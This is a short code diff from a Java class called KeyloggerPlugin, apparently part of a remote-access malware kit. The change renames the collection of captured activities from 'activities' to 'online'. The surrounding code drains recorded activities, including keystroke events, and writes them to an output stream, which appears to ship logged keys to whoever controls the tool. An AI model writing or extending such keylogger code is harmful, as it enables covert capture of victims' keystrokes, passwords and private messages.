@@ -47,12 +47,12 @@ public class KeyloggerPlugin extends StubPlugin {
 		if (header == STATUS_HEADER) {
 			dos.writeByte(STATUS_HEADER);
 
-			int size = Activities.activities.size();
+			int size = Activities.online.size();
 
 			dos.writeInt(size);
 
 			for (int i = 0; i < size; i++) {
-				Activity activity = Activities.activities.remove(0);
+				Activity activity = Activities.online.remove(0);
 				try {
 					dos.writeBoolean(activity instanceof Key);
 					activity.write(dos);
